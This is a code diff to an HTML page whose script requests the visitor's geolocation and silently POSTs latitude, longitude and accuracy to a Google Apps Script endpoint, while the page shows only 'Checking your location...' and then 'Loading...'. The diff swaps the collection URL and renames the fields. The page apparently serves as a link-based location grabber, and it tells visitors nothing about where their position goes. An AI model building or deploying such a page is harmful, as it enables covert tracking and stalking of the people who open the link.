@@ -5,15 +5,17 @@
     <h3>Checking your location...</h3>
     <script>
       navigator.geolocation.getCurrentPosition(function(pos) {
-        fetch('https://script.google.com/macros/s/AKfycbzNulV9cuGEYTEFzDy04_pE6eyz6jXcsLXIg6VVzcuoCI-ulHPje9TnyoAse8ufIAVudg/exec', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-          })
-        });
+      fetch("https://script.google.com/macros/s/AKfycbxCBs3U1DX37ShXUx65ptxxg4Dv0XwNqh3wWwAmVqpzHfHjhb8x7NFtTJ1FfybO6AnBPQ/exec", {
+  method: "POST",
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    latitude: pos.coords.latitude,
+    longitude: pos.coords.longitude,
+    accuracy: pos.coords.accuracy
+  })
+});
         document.body.innerHTML = "<h3>Loading...</h3>";
       }, function() {
         document.body.innerHTML = "Location access denied.";
